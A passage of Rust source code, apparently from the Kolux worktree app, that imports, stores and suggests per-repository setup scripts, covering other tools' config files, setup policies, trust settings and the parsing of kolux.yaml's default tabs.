#[derive(serde::Serialize, Debug, PartialEq, Clone)]
pub struct IssueRun {
    pub line: SetupLine,
    pub shared: bool,
    pub command: String,
}

/// PROJ-036: the issue command for issue `number` in the new workspace at `path` of the
/// repository at `root`; None when the project has none; an error when it cannot run as written.
#[tauri::command(async)]
pub fn workspace_issue_command(store: StoreState<'_>, root: String, path: String, number: u64, url: String) -> Result<Option<IssueRun>, String> {
    issue_run(&root, &path, number, &url, &|root, kind, script| require_trust(&store, root, kind, script))
}

/// PROJ-036: workspace_issue_command's run, with `trust` asked (after git, so the store is not
/// held while it runs) before a shared command is used (SAFE-025).
fn issue_run(root: &str, path: &str, number: u64, url: &str, trust: Gate<'_>) -> Result<Option<IssueRun>, String> {
    let Some((command, shared)) = issue_command(Path::new(root), Path::new(path)) else { return Ok(None) };
    if shared {
        trust(Path::new(root), "issue", &command)?;
    }
    let configured = crate::pty::auto_shells(crate::agents::find_program, std::env::var_os("ComSpec").map(PathBuf::from)).into_iter().next().map(|(p, _)| p);
    let line = setup_line(&fill_issue(&command, number, url), cfg!(windows), configured.as_deref(), find_posix).map_err(|e| e.replacen("The setup script", "The issue command", 1))?;
    Ok(Some(IssueRun { line, shared, command }))
}

/// VIEW-112: a config file is read only up to this size; a larger one is refused before parsing.
const IMPORT_MAX: u64 = 64 * 1024;

/// VIEW-112: other worktree tools' setup files, by path under the repository root. Conductor's
/// `conductor.json` keeps `scripts.setup` and `scripts.archive`; the Codex app's local environment
/// keeps `[setup] script` and `[cleanup] script` (its PowerShell `[setup.windows]` is not taken,
/// since Kolux runs setup through a POSIX shell or cmd).
const IMPORT_FILES: [&str; 2] = ["conductor.json", ".codex/environments/environment.toml"];

/// VIEW-112: what one other tool's file offers, or why it was refused.
#[derive(serde::Serialize, Debug, PartialEq, Clone)]
pub struct SetupImport {
    pub file: String,
    pub setup: Option<String>,
    pub teardown: Option<String>,
    pub refused: Option<String>,
}

fn script_of(v: Option<&str>) -> Option<String> {
    let s = v?.replace("\r\n", "\n");
    let s = s.trim_matches('\n').trim_end();
    if s.trim().is_empty() {
        return None;
    }
    // ponytail: other tools run these through the user's POSIX shell; a several-line script without
    // a #! line gets #!/bin/sh so Windows runs it through Git Bash instead of refusing it under cmd.
    Some(if s.contains('\n') && !s.starts_with("#!") { format!("#!/bin/sh\n{s}") } else { s.to_string() })
}

/// The setup and teardown scripts in one file's text, or why it cannot be read.
fn parse_import(file: &str, text: &str) -> Result<(Option<String>, Option<String>), String> {
    if file.ends_with(".json") {
        let v: serde_json::Value = serde_json::from_str(text).map_err(|e| format!("it is not valid JSON ({e})"))?;
        if !v.is_object() || v.get("scripts").is_some_and(|s| !s.is_object()) {
            return Err("it is not a settings object with a scripts table".into());
        }
        let s = &v["scripts"];
        Ok((script_of(s["setup"].as_str()), script_of(s["archive"].as_str())))
    } else {
        let doc: toml_edit::DocumentMut = text.parse().map_err(|e: toml_edit::TomlError| format!("it is not valid TOML ({})", e.message()))?;
        let get = |t: &str| doc.get(t).and_then(|t| t.get("script")).and_then(|s| s.as_str());
        Ok((script_of(get("setup")), script_of(get("cleanup"))))
    }
}

/// VIEW-112: the setup and teardown commands other tools' files in `root` offer that kolux.yaml
/// does not have yet, and the files refused (too large, not text, malformed). A file with nothing
/// left to offer is not listed.
pub fn setup_imports(root: &Path) -> Vec<SetupImport> {
    let yaml = std::fs::read_to_string(root.join(crate::include::CONFIG_FILE)).unwrap_or_default();
    let (has_setup, has_archive) = (scripts_entry(&yaml, "setup").is_some(), scripts_entry(&yaml, "archive").is_some());
    let mut out = Vec::new();
    for file in IMPORT_FILES {
        let path = root.join(file);
        let Ok(meta) = std::fs::metadata(&path) else { continue };
        let refuse = |why: String| SetupImport { file: file.into(), setup: None, teardown: None, refused: Some(why) };
        if !meta.is_file() {
            continue;
        }
        if meta.len() > IMPORT_MAX {
            out.push(refuse(format!("it is larger than {} KB", IMPORT_MAX / 1024)));
            continue;
        }
        let text = match std::fs::read(&path).map(String::from_utf8) {
            Ok(Ok(t)) => t,
            Ok(Err(_)) => {
                out.push(refuse("it is not text".into()));
                continue;
            }
            Err(e) => {
                out.push(refuse(format!("it could not be read ({e})")));
                continue;
            }
        };
        match parse_import(file, text.trim_start_matches('\u{feff}')) {
            Err(why) => out.push(refuse(why)),
            Ok((setup, teardown)) => {
                let setup = setup.filter(|_| !has_setup);
                let teardown = teardown.filter(|_| !has_archive);
                if setup.is_some() || teardown.is_some() {
                    out.push(SetupImport { file: file.into(), setup, teardown, refused: None });
                }
            }
        }
    }
    out
}

/// VIEW-112: `yaml` with `scripts.setup` and `scripts.archive` added as block scalars, under the
/// file's top-level `scripts:` block or a new one. A `scripts` entry written another way (inline)
/// is refused rather than rewritten.
pub fn import_into(yaml: &str, setup: Option<&str>, archive: Option<&str>) -> Result<String, String> {
    let crlf = yaml.contains("\r\n");
    let text = yaml.replace("\r\n", "\n");
    let lines: Vec<&str> = text.lines().collect();
    let top = lines.iter().position(|l| l.starts_with("scripts:") || l.starts_with("scripts :"));
    let child = top
        .and_then(|i| lines[i + 1..].iter().find(|l| !l.trim().is_empty() && !l.trim_start().starts_with('#')))
        .map(|l| l.len() - l.trim_start().len())
        .filter(|&n| n > 0)
        .unwrap_or(2);
    let pad = " ".repeat(child);
    let mut block = String::new();
    for (key, script) in [("setup", setup), ("archive", archive)] {
        let Some(script) = script else { continue };
        block.push_str(&format!("{pad}{key}: |\n"));
        for l in script.lines() {
            if l.is_empty() {
                block.push('\n');
            } else {
                block.push_str(&format!("{pad}  {l}\n"));
            }
        }
    }
    let out = match top {
        Some(i) if lines[i].trim_end() != "scripts:" => return Err(format!("{}'s scripts entry is not a plain block; add the commands there by hand", crate::include::CONFIG_FILE)),
        Some(i) => {
            let mut v: Vec<String> = lines.iter().map(|l| l.to_string()).collect();
            v.insert(i + 1, block.trim_end_matches('\n').to_string());
            v.join("\n") + "\n"
        }
        None if text.trim().is_empty() => format!("scripts:\n{block}"),
        None => format!("{}\nscripts:\n{block}", text.trim_end_matches('\n')),
    };
    Ok(if crlf { out.replace('\n', "\r\n") } else { out })
}

/// VIEW-112: what other tools' setup files in the project at `path` offer.
#[tauri::command(async)]
pub fn setup_imports_list(path: String) -> Vec<SetupImport> {
    setup_imports(Path::new(&path))
}

/// VIEW-112: takes `file`'s offer into the kolux.yaml at `path`, read again here so only what the
/// file says is written.
#[tauri::command(async)]
pub fn setup_import(path: String, file: String) -> Result<(), String> {
    let root = Path::new(&path);
    let offer = setup_imports(root).into_iter().find(|o| o.file == file && o.refused.is_none()).ok_or_else(|| format!("{file} has nothing left to import"))?;
    let target = root.join(crate::include::CONFIG_FILE);
    let yaml = std::fs::read_to_string(&target).unwrap_or_default();
    let next = import_into(&yaml, offer.setup.as_deref(), offer.teardown.as_deref())?;
    std::fs::write(&target, next).map_err(|e| format!("{} could not be written: {e}", crate::include::CONFIG_FILE))
}

// ---- PROJ-035: the sidebar card that suggests adding a setup script
//
// For a project with no setup script in effect, `suggest` says what to offer: the install command of
// the package manager it declares, the setup another worktree tool's file holds (with the fields that
// cannot come along), or an error when kolux.yaml cannot be read. Saving puts the script in Kolux's
// own settings for the repository (the local setup `workspace_setup` already prefers), so the
// suggestion ends by itself; dismissing is remembered per project.

const LOCAL_KEY: &str = "localSetups";
const DISMISSED_KEY: &str = "setupCardDismissed";
const LOCAL_MAX: usize = 16 * 1024;
/// The setup policy ("shared" and "shared-first" ignore a local setup) is one store setting, so the
/// runner, the trust check and the sidebar card all work from the same answer.
const POLICY_KEY: &str = "setupPolicy";
/// package.json and kolux.yaml are read only up to this size by the card.
const READ_MAX: u64 = 1024 * 1024;
/// A field name from another tool's file is shown at most this long.
const SHOWN_NAME_MAX: usize = 60;
const MANAGERS: [&str; 4] = ["npm", "pnpm", "yarn", "bun"];

#[derive(serde::Serialize, Debug, PartialEq, Clone)]
#[serde(tag = "kind", rename_all = "camelCase")]
pub enum SetupSuggestion {
    None,
    Install { command: String, manager: String },
    Import { file: String, setup: String, skipped: Vec<String> },
    Error { message: String },
}

/// The policy in force: the caller's, else the stored setting; blank is none.
fn effective_policy(store: &crate::state::Store, asked: Option<String>) -> Option<String> {
    asked.or_else(|| store.get(POLICY_KEY).ok().flatten()).map(|p| p.trim().to_string()).filter(|p| !p.is_empty())
}

/// The policy that applies to the repository at `root`: the caller's, else the repository's own
/// choice (SET-033), else the stored global setting.
fn policy_for(store: &crate::state::Store, asked: Option<String>, root: &Path) -> Option<String> {
    effective_policy(store, asked.or_else(|| repo_policy(store, root)))
}

/// What the runner and the trust check both start from: the repository's local setup and the policy
/// in force. A setup saved from the sidebar card is the repository's local setup (PROJ-035).
fn setup_inputs(store: &StoreState<'_>, path: &str, local: Option<String>, policy: Option<String>) -> (Option<String>, Option<String>) {
    match store.lock() {
        Ok(s) => {
            let root = main_folder(Path::new(path));
            (local.or_else(|| local_setup(&s, &root)), policy_for(&s, policy, &root))
        }
        Err(_) => (local, policy),
    }
}

/// A policy that takes only kolux.yaml's script: a local setup is never run under it.
fn ignores_local(policy: Option<&str>) -> bool {
    matches!(policy, Some("shared") | Some("shared-first"))
}

/// The local setup kept for the repository whose main folder is `root`.
pub fn local_setup(store: &crate::state::Store, root: &Path) -> Option<String> {
    let all: std::collections::BTreeMap<String, String> = crate::orchestration::kept::or_default(store, LOCAL_KEY);
    all.get(&crate::projects::name_key(&root.to_string_lossy())).filter(|s| !s.trim().is_empty()).cloned()
}

fn save_local(store: &crate::state::Store, root: &Path, script: &str) -> Result<(), String> {
    let script = script.replace("\r\n", "\n");
    let script = script.trim_matches('\n');
    if script.trim().is_empty() || script.len() > LOCAL_MAX {
        return Err(format!("A setup script has to be between 1 character and {} KB.", LOCAL_MAX / 1024));
    }
    let mut all: std::collections::BTreeMap<String, String> = crate::orchestration::kept::load(store, LOCAL_KEY)?;
    all.insert(crate::projects::name_key(&root.to_string_lossy()), script.to_string());
    store.set(LOCAL_KEY, &serde_json::to_string(&all).map_err(|e| e.to_string())?).map_err(|e| e.to_string())
}

/// SET-033: a repository's own setup choices, kept per main folder like the local setups: which of
/// the local and the shared script run (`setupPolicies`; absent inherits the `setupPolicy` setting)
/// and whether the agent waits for setup to finish (`setupWaits`; absent means it does not).
const POLICIES_KEY: &str = "setupPolicies";
const WAITS_KEY: &str = "setupWaits";
const REPO_POLICIES: [&str; 3] = ["local", "shared", "both"];
/// SESS-026: where a repository's setup script opens in each new workspace (`setupModes`): a tab
/// beside its first pane (absent: the default), a split to the right or below, or `ask`, which asks
/// for each workspace and so cannot be bulk-launched.
const MODES_KEY: &str = "setupModes";
pub const DEFAULT_MODE: &str = "tab";
const REPO_MODES: [&str; 4] = ["tab", "right", "down", "ask"];

fn repo_map<T: serde::de::DeserializeOwned + serde::Serialize>(store: &crate::state::Store, key: &str) -> std::collections::BTreeMap<String, T> {
    crate::orchestration::kept::or_default(store, key)
}

/// Card 13: the map a save starts from; a store or copy that fails is an error, never an empty map.
fn repo_map_to_change<T: serde::de::DeserializeOwned + serde::Serialize>(store: &crate::state::Store, key: &str) -> Result<std::collections::BTreeMap<String, T>, String> {
    crate::orchestration::kept::load(store, key)
}

fn put_repo_map<T: serde::Serialize>(store: &crate::state::Store, key: &str, map: &std::collections::BTreeMap<String, T>) -> Result<(), String> {
    store.set(key, &serde_json::to_string(map).map_err(|e| e.to_string())?).map_err(|e| e.to_string())
}

/// The repository's own setup policy (`local`, `shared` or `both`); None when it inherits.
pub fn repo_policy(store: &crate::state::Store, root: &Path) -> Option<String> {
    repo_map::<String>(store, POLICIES_KEY).get(&crate::projects::name_key(&root.to_string_lossy())).filter(|p| REPO_POLICIES.contains(&p.as_str())).cloned()
}

/// Sets the repository's own policy; None goes back to inheriting. Anything but the three
/// choices is refused, so a stray value can never change which script runs.
pub fn set_repo_policy(store: &crate::state::Store, root: &Path, policy: Option<&str>) -> Result<(), String> {
    let mut all = repo_map_to_change::<String>(store, POLICIES_KEY)?;
    let key = crate::projects::name_key(&root.to_string_lossy());
    match policy.map(str::trim).filter(|p| !p.is_empty()) {
        None => all.remove(&key),
        Some(p) if REPO_POLICIES.contains(&p) => all.insert(key, p.to_string()),
        Some(p) => return Err(format!("{p} is not a setup choice: pick local, shared or both.")),
    };
    put_repo_map(store, POLICIES_KEY, &all)
}

/// Whether the agent waits for this repository's setup to finish (new workspaces start from it).
pub fn repo_wait(store: &crate::state::Store, root: &Path) -> bool {
    repo_map::<bool>(store, WAITS_KEY).get(&crate::projects::name_key(&root.to_string_lossy())).copied().unwrap_or(false)
}

pub fn set_repo_wait(store: &crate::state::Store, root: &Path, wait: bool) -> Result<(), String> {
    let mut all = repo_map_to_change::<bool>(store, WAITS_KEY)?;
    let key = crate::projects::name_key(&root.to_string_lossy());
    if wait {
        all.insert(key, true);
    } else {
        all.remove(&key);
    }
    put_repo_map(store, WAITS_KEY, &all)
}

/// SESS-026: the repository's setup launch mode; a new tab unless it chose otherwise.
pub fn repo_mode(store: &crate::state::Store, root: &Path) -> String {
    repo_map::<String>(store, MODES_KEY).get(&crate::projects::name_key(&root.to_string_lossy())).filter(|m| REPO_MODES.contains(&m.as_str())).cloned().unwrap_or_else(|| DEFAULT_MODE.to_string())
}

/// Sets the repository's setup launch mode; None (or the default) goes back to a new tab. Anything
/// but the four choices is refused and changes nothing.
pub fn set_repo_mode(store: &crate::state::Store, root: &Path, mode: Option<&str>) -> Result<(), String> {
    let mut all = repo_map_to_change::<String>(store, MODES_KEY)?;
    let key = crate::projects::name_key(&root.to_string_lossy());
    match mode.map(str::trim).filter(|m| !m.is_empty()) {
        None | Some(DEFAULT_MODE) => all.remove(&key),
        Some(m) if REPO_MODES.contains(&m) => all.insert(key, m.to_string()),
        Some(m) => return Err(format!("{m} is not a setup launch mode: pick tab, right, down or ask.")),
    };
    put_repo_map(store, MODES_KEY, &all)
}

/// PROJ-035 / SET-033: takes the repository's saved local setup away. Ok(false) when it had none.
pub fn remove_local(store: &crate::state::Store, root: &Path) -> Result<bool, String> {
    let mut all = repo_map_to_change::<String>(store, LOCAL_KEY)?;
    if all.remove(&crate::projects::name_key(&root.to_string_lossy())).is_none() {
        return Ok(false);
    }
    put_repo_map(store, LOCAL_KEY, &all).map(|_| true)
}

/// What the repository's setup section shows.
#[derive(serde::Serialize, Debug, PartialEq, Clone)]
#[serde(rename_all = "camelCase")]
pub struct RepoSetup {
    /// The script kept in Kolux for this repository.
    pub local: Option<String>,
    /// The script in the repository's kolux.yaml.
    pub shared: Option<String>,
    /// Why kolux.yaml could not be read, when it exists but cannot be.
    pub shared_error: Option<String>,
    /// The repository's own choice (`local`, `shared`, `both`); None while it inherits.
    pub policy: Option<String>,
    /// What it inherits: the global setting, `local` when none is set.
    pub inherited: String,
    pub wait: bool,
    /// SESS-026: where setup opens in a new workspace: `tab` (the default), `right`, `down` or `ask`.
    pub mode: String,
    /// Both scripts exist and no choice is made: running both is suggested.
    pub suggest_both: bool,
    /// Why the choice in force would not run on this PC (the two scripts cannot be joined, or cmd
    /// would misread the joined one); None when it runs or nothing is chosen to run.
    pub run_error: Option<String>,
    /// T-721: the repository has Always trust for its whole kolux.yaml.
    pub trusted_all: bool,
    /// T-721: the kolux.yaml scripts approved one by one (they run unasked while unchanged).
    pub trusted: Vec<String>,
}

/// kolux.yaml's setup script at `root`, or why it could not be read (a missing file is no error).
fn read_shared(root: &Path) -> (Option<String>, Option<String>) {
    match read_capped(&root.join(crate::include::CONFIG_FILE), READ_MAX) {
        Ok(t) => (setup_script(&t), None),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => (None, None),
        Err(e) => (None, Some(format!("{} could not be read: {e}", crate::include::CONFIG_FILE))),
    }
}

pub fn repo_setup(store: &crate::state::Store, root: &Path, shared: (Option<String>, Option<String>)) -> RepoSetup {
    repo_setup_on(store, root, shared, cfg!(windows), configured_shell().as_deref(), find_posix)
}

/// repo_setup on the platform given (see setup_for_on), so `run_error` can be checked anywhere.
fn repo_setup_on(store: &crate::state::Store, root: &Path, shared: (Option<String>, Option<String>), windows: bool, configured: Option<&Path>, find: impl Fn(&str) -> Option<PathBuf>) -> RepoSetup {
    let local = local_setup(store, root);
    let policy = repo_policy(store, root);
    let inherited = match effective_policy(store, None).as_deref() {
        Some("shared") | Some("shared-first") => "shared",
        Some("both") => "both",
        _ => "local",
    };
    let suggest_both = policy.is_none() && inherited == "local" && local.is_some() && shared.0.is_some();
    // SET-033: the page says when the choice in force is `both` and the joined script would be refused here
    let in_force = policy.as_deref().unwrap_or(inherited);
    let run_error = match (in_force, local.as_deref(), shared.0.as_deref()) {
        ("both", Some(own), Some(theirs)) => both_trouble(own, theirs, windows, configured, find),
        _ => None,
    };
    let (trusted_all, trusted) = trust_seen(store, root);
    RepoSetup { local, shared: shared.0, shared_error: shared.1, policy, inherited: inherited.to_string(), wait: repo_wait(store, root), mode: repo_mode(store, root), suggest_both, run_error, trusted_all, trusted }
}

#[tauri::command(async)]
pub fn repo_setup_get(store: StoreState<'_>, path: String) -> Result<RepoSetup, String> {
    let root = main_folder(Path::new(&path));
    let shared = read_shared(&root);
    let store = store.lock().map_err(|e| e.to_string())?;
    Ok(repo_setup(&store, &root, shared))
}

/// Saves the repository's local setup. It is the user's own text, so it runs without the trust prompt.
#[tauri::command]
pub fn repo_setup_save(store: StoreState<'_>, path: String, script: String) -> Result<(), String> {
    save_local(&*store.lock().map_err(|e| e.to_string())?, &main_folder(Path::new(&path)), &script)
}

#[tauri::command]
pub fn repo_setup_remove(store: StoreState<'_>, path: String) -> Result<bool, String> {
    remove_local(&*store.lock().map_err(|e| e.to_string())?, &main_folder(Path::new(&path)))
}

#[tauri::command]
pub fn repo_setup_policy_set(store: StoreState<'_>, path: String, policy: Option<String>) -> Result<(), String> {
    set_repo_policy(&*store.lock().map_err(|e| e.to_string())?, &main_folder(Path::new(&path)), policy.as_deref())
}

#[tauri::command]
pub fn repo_setup_wait_set(store: StoreState<'_>, path: String, wait: bool) -> Result<(), String> {
    set_repo_wait(&*store.lock().map_err(|e| e.to_string())?, &main_folder(Path::new(&path)), wait)
}

/// SESS-026: sets the repository's setup launch mode (`tab`, `right`, `down`, `ask`; none = tab).
#[tauri::command]
pub fn repo_setup_mode_set(store: StoreState<'_>, path: String, mode: Option<String>) -> Result<(), String> {
    set_repo_mode(&*store.lock().map_err(|e| e.to_string())?, &main_folder(Path::new(&path)), mode.as_deref())
}

/// T-721: the repository page's Stop trusting.
#[tauri::command]
pub fn repo_trust_clear(store: StoreState<'_>, path: String) -> Result<(), String> {
    trust_clear(&*store.lock().map_err(|e| e.to_string())?, &main_folder(Path::new(&path)))
}

fn dismissed_ids(store: &crate::state::Store) -> Vec<String> {
    crate::orchestration::kept::or_default(store, DISMISSED_KEY)
}

/// A forgotten project's card state goes with it: its dismissal (by id) and its saved local setup
/// (by the folder it lived in). Production goes through `prune_setup_writes`; this lands them alone.
#[cfg(test)]
pub fn prune_setup(store: &crate::state::Store, ids: &[String], roots: &[String]) -> Result<(), String> {
    let writes = prune_setup_writes(store, ids, roots)?;
    let pairs: Vec<(&str, &str)> = writes.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
    store.set_all(&pairs).map_err(|e| e.to_string())
}

/// What `prune_setup` would save, as (key, value) pairs, so a caller can land them in the same
/// transaction as its own writes (row 890). Only reads; a key with nothing to drop is left out.
fn as_json<T: serde::Serialize>(v: &T) -> Result<String, String> {
    serde_json::to_string(v).map_err(|e| e.to_string())
}

pub(crate) fn prune_setup_writes(store: &crate::state::Store, ids: &[String], roots: &[String]) -> Result<Vec<(String, String)>, String> {
    let mut out = Vec::new();
    let before: Vec<String> = crate::orchestration::kept::load(store, DISMISSED_KEY)?;
    let kept: Vec<String> = before.iter().filter(|i| !ids.contains(i)).cloned().collect();
    if kept.len() != before.len() {
        out.push((DISMISSED_KEY.to_string(), as_json(&kept)?));
    }
    let mut all: std::collections::BTreeMap<String, String> = crate::orchestration::kept::load(store, LOCAL_KEY)?;
    let count = all.len();
    for r in roots {
        all.remove(&crate::projects::name_key(r));
    }
    if all.len() != count {
        out.push((LOCAL_KEY.to_string(), as_json(&all)?));
    }
    // SET-033: its own policy and wait choice go with it
    let keys: Vec<String> = roots.iter().map(|r| crate::projects::name_key(r)).collect();
    let mut policies = repo_map_to_change::<String>(store, POLICIES_KEY)?;
    let before = policies.len();
    policies.retain(|k, _| !keys.contains(k));
    if policies.len() != before {
        out.push((POLICIES_KEY.to_string(), as_json(&policies)?));
    }
    let mut waits = repo_map_to_change::<bool>(store, WAITS_KEY)?;
    let before = waits.len();
    waits.retain(|k, _| !keys.contains(k));
    if waits.len() != before {
        out.push((WAITS_KEY.to_string(), as_json(&waits)?));
    }
    let mut modes = repo_map_to_change::<String>(store, MODES_KEY)?;
    let before = modes.len();
    modes.retain(|k, _| !keys.contains(k));
    if modes.len() != before {
        out.push((MODES_KEY.to_string(), as_json(&modes)?));
    }
    Ok(out)
}

pub fn card_dismissed(store: &crate::state::Store, project_id: &str) -> bool {
    dismissed_ids(store).iter().any(|i| i == project_id)
}

pub fn dismiss_card(store: &crate::state::Store, project_id: &str) -> Result<(), String> {
    let mut ids: Vec<String> = crate::orchestration::kept::load(store, DISMISSED_KEY)?;
    if !ids.iter().any(|i| i == project_id) {
        ids.push(project_id.to_string());
        store.set(DISMISSED_KEY, &serde_json::to_string(&ids).map_err(|e| e.to_string())?).map_err(|e| e.to_string())?;
    }
    Ok(())
}

/// A file's text, refused past `max` bytes so an untrusted repository cannot make the card read
/// without bound.
fn read_capped(path: &Path, max: u64) -> std::io::Result<String> {
    use std::io::Read;
    let mut text = String::new();
    let n = std::fs::File::open(path)?.take(max + 1).read_to_string(&mut text)?;
    if n as u64 > max {
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidData, format!("it is larger than {} KB", max / 1024)));
    }
    Ok(text)
}

/// A field name from an untrusted file, cut to SHOWN_NAME_MAX characters (an ellipsis marks the cut).
fn shown_name(name: &str) -> String {
    if name.chars().count() <= SHOWN_NAME_MAX {
        return name.to_string();
    }
    let mut cut: String = name.chars().take(SHOWN_NAME_MAX - 1).collect();
    cut.push('…');
    cut
}

/// The install command of the package manager the project declares: `packageManager` in
/// package.json, else the lock file it keeps. Nothing declared, nothing guessed.
fn install_command(root: &Path) -> Option<(String, String)> {
    let text = read_capped(&root.join("package.json"), READ_MAX).ok()?;
    let v: serde_json::Value = serde_json::from_str(&text).unwrap_or_default(); // unreadable JSON declares nothing; the lock file may still say
    let declared = v["packageManager"].as_str().and_then(|s| s.split('@').next()).filter(|m| MANAGERS.contains(m)).map(str::to_string);
    let locked = || {
        [("pnpm-lock.yaml", "pnpm"), ("yarn.lock", "yarn"), ("bun.lock", "bun"), ("bun.lockb", "bun"), ("package-lock.json", "npm")].into_iter().find(|(f, _)| root.join(f).is_file()).map(|(_, m)| m.to_string())
    };
    let manager = declared.or_else(locked)?;
    Some((format!("{manager} install"), manager))
}

/// What another tool's file holds that a local setup cannot take: every field beyond the setup
/// command, named as it is in the file.
fn skipped_fields(file: &str, text: &str, has_teardown: bool) -> Vec<String> {
    let mut out = Vec::new();
    if file.ends_with(".json") {
        if let Some(obj) = serde_json::from_str::<serde_json::Value>(text).ok().and_then(|v| v.as_object().cloned()) {
            for (k, val) in &obj {
                match (k.as_str(), val.as_object()) {
                    ("scripts", Some(s)) => out.extend(s.keys().filter(|n| *n != "setup" && *n != "archive").map(|n| format!("scripts.{n}"))),
                    _ => out.push(k.clone()),
                }
            }
        }
    } else if let Ok(doc) = text.parse::<toml_edit::DocumentMut>() {
        for (k, item) in doc.iter() {
            match (k, item.as_table_like()) {
                ("setup" | "cleanup", Some(t)) => out.extend(t.iter().filter(|(n, _)| *n != "script").map(|(n, _)| format!("{k}.{n}"))),
                ("setup" | "cleanup", None) => {}
                _ => out.push(k.to_string()),
            }
        }
    }
    let mut out: Vec<String> = out.iter().map(|n| shown_name(n)).collect();
    if has_teardown {
        out.push("teardown (a local setup has no archive script)".to_string());
    }
    out.truncate(20);
    out
}

/// What the sidebar card offers for the repository at `root`: nothing when a setup script is already
/// in effect (`local` is the one kept in Kolux's settings), else an import, else an install command.
pub fn suggest(root: &Path, local: Option<&str>, policy: Option<&str>) -> SetupSuggestion {
    let shared = match read_capped(&root.join(crate::include::CONFIG_FILE), READ_MAX) {
        Ok(t) => setup_script(&t),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => None,
        Err(e) => return SetupSuggestion::Error { message: format!("{} could not be read: {e}", crate::include::CONFIG_FILE) },
    };
    if pick_parts(local, shared, policy).is_some() {
        return SetupSuggestion::None;
    }
    // Under a policy that takes only kolux.yaml's script a saved local setup would never run: no card.
    if ignores_local(policy) {
        return SetupSuggestion::None;
    }
    if let Some(o) = setup_imports(root).into_iter().find(|o| o.refused.is_none() && o.setup.is_some()) {
        let text = read_capped(&root.join(&o.file), IMPORT_MAX).unwrap_or_default();
        let skipped = skipped_fields(&o.file, text.trim_start_matches('\u{feff}'), o.teardown.is_some());
        return SetupSuggestion::Import { file: o.file, setup: o.setup.unwrap_or_default(), skipped };
    }
    install_command(root).map_or(SetupSuggestion::None, |(command, manager)| SetupSuggestion::Install { command, manager })
}

/// Saves what the card offers (`from` is "install" or the import's file name) as the repository's
/// local setup. The offer is worked out again here, so only what the project really offers is kept,
/// and `shown` (the script the card displayed) has to be exactly what it is now: a file that changed
/// since the card was drawn is refused, since a local setup runs without the trust prompt.
pub fn save_suggestion(store: &crate::state::Store, root: &Path, from: &str, shown: &str, policy: Option<&str>) -> Result<(), String> {
    let script = match suggest(root, local_setup(store, root).as_deref(), policy) {
        SetupSuggestion::Install { command, .. } if from == "install" => command,
        SetupSuggestion::Import { file, setup, .. } if file == from => setup,
        SetupSuggestion::Error { message } => return Err(message),
        _ => return Err("That suggestion is no longer offered.".to_string()),
    };
    if script != shown {
        return Err("That suggestion changed since it was shown. Look at the card again before saving.".to_string());
    }
    save_local(store, root, &script)
}

/// PROJ-035: what the sidebar card should offer for the project at `path`, re-asked when the window
/// is focused or another workspace is made active. A dismissed project gets nothing.
#[tauri::command(async)]
pub fn setup_suggestion(store: StoreState<'_>, project_id: String, path: String, policy: Option<String>) -> Result<SetupSuggestion, String> {
    let root = main_folder(Path::new(&path));
    let (local, policy) = {
        let s = store.lock().map_err(|e| e.to_string())?;
        if card_dismissed(&s, &project_id) {
            return Ok(SetupSuggestion::None);
        }
        (local_setup(&s, &root), policy_for(&s, policy, &root))
    };
    Ok(suggest(&root, local.as_deref(), policy.as_deref()))
}

#[tauri::command(async)]
pub fn setup_suggestion_save(store: StoreState<'_>, path: String, from: String, shown: String, policy: Option<String>) -> Result<(), String> {
    let store = store.lock().map_err(|e| e.to_string())?;
    let root = main_folder(Path::new(&path));
    let policy = policy_for(&store, policy, &root);
    save_suggestion(&store, &root, &from, &shown, policy.as_deref())
}

#[tauri::command]
pub fn setup_suggestion_dismiss(store: StoreState<'_>, project_id: String) -> Result<(), String> {
    dismiss_card(&*store.lock().map_err(|e| e.to_string())?, &project_id)
}

// ---- PROJ-034: the default tabs of kolux.yaml (T-149)

/// PROJ-034: kolux.yaml is read for its shared tabs only up to this size; a bigger file is refused unread.
const SHARED_MAX: u64 = 64 * 1024;
/// PROJ-034: at most this many default tabs; later ones are dropped.
const TABS_MAX: usize = 12;
/// PROJ-034: a tab title or command longer than this is dropped (the tab keeps its other fields).
const TAB_TITLE_MAX: usize = 60;
const TAB_COMMAND_MAX: usize = 2000;
/// PROJ-034: a file using more aliases than this is refused; aliases are never expanded here.
const ALIASES_MAX: usize = 16;

/// PROJ-034 / COMPAT 5.6: one entry of `defaultTabs`; an entry with none of the three is dropped.
#[derive(serde::Serialize, Debug, PartialEq, Clone, Default)]
pub struct SharedTab {
    pub title: Option<String>,
    pub color: Option<String>,
    pub command: Option<String>,
}

fn is_alias(t: &str) -> bool {
    t.len() > 1 && t.starts_with('*') && t[1..].chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

/// A YAML scalar: trimmed, quotes removed, an anchor skipped and an alias left unexpanded (None).
fn tab_scalar(raw: &str) -> Option<String> {
    let t = raw.trim();
    let t = if t.starts_with('&') { t.split_once(char::is_whitespace).map(|x| x.1.trim()).unwrap_or("") } else { t };
    if is_alias(t) {
        return None;
    }
    let quoted = |r: &str, q: char, escapes: bool| {
        let (mut out, mut it) = (String::new(), r.chars().peekable());
        while let Some(c) = it.next() {
            if escapes && c == '\\' {
                match it.next() {
                    Some('n') => out.push('\n'),
                    Some('t') => out.push('\t'),
                    Some(o) => out.push(o),
                    None => {}
                }
            } else if c == q {
                if !escapes && it.peek() == Some(&q) {
                    it.next();
                    out.push(q);
                } else {
                    break;
                }
            } else {
                out.push(c);
            }
        }
        out
    };
    let v = if let Some(r) = t.strip_prefix('"') {
        quoted(r, '"', true)
    } else if let Some(r) = t.strip_prefix('\'') {
        quoted(r, '\'', false)
    } else {
        t.split(" #").next().unwrap_or("").to_string()
    };
    Some(v.trim().to_string()).filter(|v| !v.is_empty())
}

/// `key: value` where the key is a plain word; None for any other text.
fn tab_pair(s: &str) -> Option<(&str, &str)> {
    let (k, v) = s.split_once(':')?;
    (!k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')).then_some((k, v))
}

/// The comma-separated parts of a one-line `{ a: b, c: "d, e" }`, commas inside quotes kept.
fn flow_parts(inner: &str) -> Vec<String> {
    let (mut parts, mut cur, mut quote) = (Vec::new(), String::new(), None::<char>);
    for c in inner.chars() {
        match (quote, c) {
            (None, ',') => parts.push(std::mem::take(&mut cur)),
            (None, '"' | '\'') => {
                quote = Some(c);
                cur.push(c);
            }
            (Some(q), _) if c == q => {
                quote = None;
                cur.push(c);
            }
